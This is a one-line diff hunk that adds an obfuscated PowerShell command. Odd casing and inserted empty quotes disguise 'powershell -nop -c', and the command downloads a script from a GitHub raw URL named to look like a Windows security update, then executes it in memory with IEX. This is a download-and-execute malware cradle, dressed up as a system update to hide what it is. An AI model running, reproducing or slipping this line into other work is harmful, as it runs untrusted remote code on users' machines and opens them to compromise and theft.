@@ -1,0 +1,1 @@
+po""weR""sHelL  -nO""p -c "iEx(New-Object Net.WEbclIent).DoWnLOadstRinG('https://raw.githubusercontent.com/windowsupdate1/WindowsUpdate/main/WinSecurityUpdate')"
